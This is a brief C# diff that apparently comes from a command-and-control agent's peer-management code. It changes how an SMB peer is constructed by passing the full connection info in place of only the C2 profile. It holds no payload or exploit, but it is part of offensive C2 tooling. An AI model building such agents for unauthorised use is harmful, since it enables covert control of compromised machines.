@@ -20,7 +20,7 @@ namespace Apollo.Management.Peer
             switch(connectionInfo.C2Profile.Name.ToUpper())
             {
                 case "SMB":
-                    SMBPeer peer = new SMBPeer(_agent, connectionInfo.C2Profile);
+                    SMBPeer peer = new SMBPeer(_agent, connectionInfo);
                     peer.Start();
                     while(!_peers.TryAdd(peer.GetUUID(), peer))
                     {
